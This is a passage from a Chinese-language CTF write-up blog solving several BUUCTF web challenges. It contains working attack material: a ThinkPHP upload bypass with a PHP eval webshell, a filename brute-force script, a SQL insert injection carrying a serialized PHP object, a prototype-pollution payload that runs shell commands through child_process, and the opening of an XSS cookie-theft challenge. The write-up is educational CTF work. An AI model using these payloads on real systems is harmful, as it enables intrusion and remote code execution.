class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>限制分析</strong><br>主要的限制有上传文件的后缀名限制为不能为<code>.php</code>与下面的这句关于只能上传图片的限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型</span><br></pre></td></tr></table></figure>
<p>但是<code>$upload-&gt;allowExts</code>并不是<code>Think\Upload</code>类的正确用法，所以<code>allowexts 后缀名限制</code>是无效的,所有说我们只需绕过后缀不能为.php的限制</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu27.jpg"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu28.jpg"></p>
<p>然后怎么绕过对文件名不能为<code>.php</code>的限制呢？这里要用到的知识点为<code> think\upload 类的多文件上传</code>与<code> think\upload 类是怎么生成文件名的</code></p>
<p><strong>think\upload 类的多文件上传tp多文件上传</strong></p>
<blockquote>
<p>upload() 函数不传参时为多文件上传，整个 $_FILES 数组的文件都会上传并保存。</p>
</blockquote>
<p><strong>think\upload类是怎么生成文件名的</strong></p>
<p>从官方手册上可以查找到</p>
<blockquote>
<p>$upload -&gt; saveName = array (‘uniqid’ , ‘ ‘);</p>
<p>默认的命名规则设置是采用uniqid函数生成一个唯一的字符串序列。</p>
</blockquote>
<p><strong>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。故同时上传的两个文件的文件名一定不会差的很远，可爆破。</strong>所以这个时候我们上传第一个txt文件，再上传第三个txt文件，那么我们就可以知道我们上传第二个php木马文件在这个时间区域内的所在区间，就可以爆破出我们的木马文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/index.php/Home/Index/upload&#x27;</span></span><br><span class="line">file1 = &#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">file2 = &#123;<span class="string">&#x27;file[]&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125; <span class="comment">#upload()不传参时即是批量上传所以用[]</span></span><br><span class="line">r = requests.post(url,files = file1)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line">r = requests.post(url,files = file2)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line">r = requests.post(url, files = file1)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu29.jpg"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">dir</span> =<span class="string">&#x27;abcdef0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                    url = <span class="string">&#x27;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/Public/Uploads/2021-01-28/601284cc&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,j,k,x,y)</span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    print(<span class="string">&quot;%s,%s&quot;</span> % (url, r,))</span><br><span class="line">                    time.sleep(<span class="number">0.1</span>)  //防止BUU 的 <span class="number">429</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        print(url)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>由于BUU 429 的原因，爆破的时间有点久</p>
<p>得到文件名之后, 访问连接即可得到flag ,<del>本来还以为要命令执行的</del></p>
<p>看了大师傅的WP发现还有个非预期解 ，用 <code>shell.&lt;&gt;php</code> 来 绕过对php后缀的限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/index.php/home/index/upload/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.&lt;&gt;php&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得上传文件路径：http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/Public/Uploads/2021-01-28/60128a068af5e.php</span></span><br></pre></td></tr></table></figure>




<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>知识点</p>
<ol>
<li>信息泄漏</li>
<li>SQL注入</li>
<li>反序列化</li>
</ol>
<p><strong>获取源码</strong></p>
<p>在主页的源码下方有一个开发人员留的信息，可知网站的源码已经被上传的github上面了。</p>
<p>而网站源码的名称就是网页页脚的wowouploadimage, github搜索这个名称，即可找到源码。</p>
<p><strong>SQL注入 =&gt; 反序列化 =&gt; 读取Flag</strong></p>
<p>在图片上传处，check函数并未对文件名(title)进行检测, 直接传递到最后的SQL语句当中。导致了SQL注入，并且属于Insert注入。</p>
<p>审计代码后可知，图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存。在查看图片信息的页面(show.php)会对其进行反序列化。</p>
<p>我们需要通过SQL注入修改保存的信息中的序列化的值来利用。</p>
<p>在helper.php中的helper类中有一个<code>__destruct</code>魔术方法可以利用，通过调用<code>view_files</code>中的<code>file_get_contents</code>来读取flag。</p>
<p><strong>构造payload</strong></p>
<p>反序列化payload生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">True</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里的属性值ifview和config都是protected类型的，所以需要将payload修改为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>(以至于为什么要将修改为\0\0\0，是因为源码中在存取过程中对protected类型的属性进行了处理。)</p>
<p>正常上传图片的sql语句为：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="symbol">`title`</span>,<span class="symbol">`filename`</span>,<span class="symbol">`ext`</span>,<span class="symbol">`path`</span>,<span class="symbol">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;TIM截图20191102114857&#x27;</span>,<span class="string">&#x27;f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>由于title处是我们能够控制的，所以构造文件名如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,<span class="number">0</span>x<span class="number">4</span>f<span class="number">3</span>a<span class="number">363</span>a<span class="number">2268656</span>c<span class="number">706572223</span>a<span class="number">323</span>a<span class="number">7</span>b<span class="number">733</span>a<span class="number">393</span>a<span class="number">225</span>c<span class="number">305</span>c<span class="number">305</span>c<span class="number">30696676696577223</span>b<span class="number">623</span>a<span class="number">313</span>b<span class="number">733</span>a<span class="number">393</span>a<span class="number">225</span>c<span class="number">305</span>c<span class="number">305</span>c<span class="number">30636</span>f<span class="number">6</span>e<span class="number">666967223</span>b<span class="number">733</span>a<span class="number">353</span>a<span class="number">222</span>f<span class="number">666</span>c<span class="number">6167223</span>b<span class="number">7</span>d),(&#x27;<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。</p>
<p>使用 Brupsuite 将上传的 filename 修改为构造的文件名上传，再访问 show.php 即可得到flag。</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>和以前做的入门题 <code>秋名山车神</code> 神似，直接放脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">view = source.text</span><br><span class="line"></span><br><span class="line">equation = <span class="built_in">eval</span>(<span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">&quot;&lt;br&gt;&lt;br&gt;(\d.*)&lt;br&gt;&lt;br&gt;&lt;form&quot;</span>,view)))</span><br><span class="line">flag = s.post(<span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span>, data=&#123;<span class="string">&#x27;answer&#x27;</span>: equation&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    equation = <span class="built_in">eval</span>(<span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">&quot;&lt;br&gt;&lt;br&gt;(\d.*)&lt;br&gt;&lt;br&gt;&lt;form&quot;</span>,flag.text)))</span><br><span class="line">    flag = s.post(<span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span>, data = &#123;<span class="string">&#x27;answer&#x27;</span>:equation&#125;)</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>


<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>知识点：</p>
<ol>
<li>NodeJs 原型链污染</li>
<li>javascript 大小写绕过</li>
</ol>
<p>P神的文章 <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript" target="_blank">深入理解 JavaScript Prototype 污染攻击</a></p>
<p><strong>原型链的污染主要和两个函数有关</strong></p>
<blockquote>
<p><strong>merge()</strong><br><strong>clone()</strong></p>
</blockquote>
<p><strong>常用源码如下,可以看出clone与merge并无本质区别：</strong></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>本质上这两个函数会有风险，就是因为存在能够控制数组（对象）的“键名”的操作。</strong><br> <strong>但是要想实现原型链污染，光只要键名可控是不够的。以下面这个例子为参考：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> merge(target, <span class="built_in">source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">let</span> key <span class="keyword">in</span> <span class="built_in">source</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> <span class="built_in">source</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], <span class="built_in">source</span>[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = <span class="built_in">source</span>[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>尝试把第二个键名设为<code>__proto__</code>并赋值b为2。看看能不能把object的属性b改为2。</strong></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu30.webp"></strong></p>
<p><strong>污染失败</strong></p>
<p> 可以看见最后</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">o3</span>.b</span><br></pre></td></tr></table></figure>
<p><strong>返回的是</strong></p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<p><strong>,并没有污染成功。</strong></p>
<p> 主要原因就是因为</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">__proto__</span></span><br></pre></td></tr></table></figure>
<p><strong>没有被认为是一个键名。而这就需要我上面提到的另一个条件,代码如下时：</strong></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p><strong>如果存在<code>JSON.parse()</code>，就能成功把<code>__proto__</code>解析成键名了。</strong></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu30-1.webp"></strong></p>
<p><strong>污染成功</strong></p>
<p><strong>javascript的大小写绕过</strong></p>
<blockquote>
<p> “ı”.toUpperCase() == ‘I’<br> “ſ”.toUpperCase() == ‘S’<br> “K”.toLowerCase() == ‘k’</p>
</blockquote>
<hr>
<p>知识点就讲到这里，接下去分析下题目</p>
<p><a target="_blank" rel="noopener" href="http://www.zip泄露,下载下来,通过分析(主要代码在index.js),可以很容易的发现存在/">www.zip泄露，下载下来，通过分析（主要代码在index.js），可以很容易的发现存在</a> clone() 和 merge() 函数，猜测为nodejs 原型链污染，接下去要做的就是找可以被污染的参数的</p>
<p>先分析下几个主要的路由</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">//register ,参数userid 要经过 safeKeyword 函数的过滤,即对userid做了大小写的admin过滤. 成功绕过后，将会建立session目录，里面存储了注册的账号密码，注意里面的一个主要内容，user保存的是对userid做了toUpperCase()操作后的值，这个函数的利用在知识点有写，&quot;ı&quot;.toUpperCase() == &#x27;I&#x27; ，从而用ADMıN成功注册ADMIN.</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//login,将我们输入的账号密码，和session里的user,passwd比较，相同则成功登入</span></span><br></pre></td></tr></table></figure>


<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//action,如果session中的user不等于ADMIN，报错，否则对参数data做clone()操作</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//info ,这里有参数outputFunctionName，但是res.outputFunctionName=undefined;结合/action路由的clone(),也就是可以通过污染outputFunctionName进行SSTI,原理知识点里已经讲了（merge()污染）</span></span><br></pre></td></tr></table></figure>
<p>结合题目名字Ez_Express。这是一个express框架下存在的一个rce漏洞利用点。具体见这篇文章<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/" target="_blank">Express+lodash+ejs: 从原型链污染到RCE</a></p>
<p>利用链文章里有写</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要将content-type改为 application/json</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;lua&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="attr">&quot;Submit&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>到/info路径，下载得到flag文件</p>
<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>知识点：</p>
<ol>
<li>XSS 窃取cookie</li>
<li>CSP安全策略</li>
<li>常规联合注入</li>
</ol>
<p>拿到题目，随便注册下，有两个页面投稿和审核，通过扫目录可以发现还有一个admin.php路径</p>
<p>思路是通过投稿恶意XSS，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为</p>
<p>XSS构造网址题目有给  <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/">xss.buuoj.cn</a>  </p>
<p>平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>提示我们上传成功，查看下上传文件源代码</p>
